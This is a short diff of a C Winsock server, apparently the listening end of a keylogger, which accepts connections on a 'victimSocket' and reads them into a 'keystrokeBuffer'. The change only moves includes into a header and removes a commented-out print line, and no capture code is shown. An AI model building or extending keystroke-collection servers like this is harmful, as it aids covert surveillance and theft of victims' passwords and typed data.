@@ -1,9 +1,4 @@
-#include <stdio.h>
-#include <winsock.h>
-#include <stdlib.h> 
-
-#define RCVBUFSIZE 1024 
-#define MAXPENDING 5 
+#include "KeystrokeServer.h"
 
 void main(int argc, char *argv[]) {
 	INT serverSocket;
@@ -45,7 +40,6 @@ void main(int argc, char *argv[]) {
 		if ((victimSocket = accept(serverSocket, (struct sockaddr *) &victimAddr, &clntLen)) < 0) {
 			printf("accept() failed");
 		}
-		//printf("Handling client %s: \n", inet_ntoa(victimAddr.sin_addr));
 
 		CHAR keystrokeBuffer[RCVBUFSIZE+1];
 		INT recvMsgSize; 
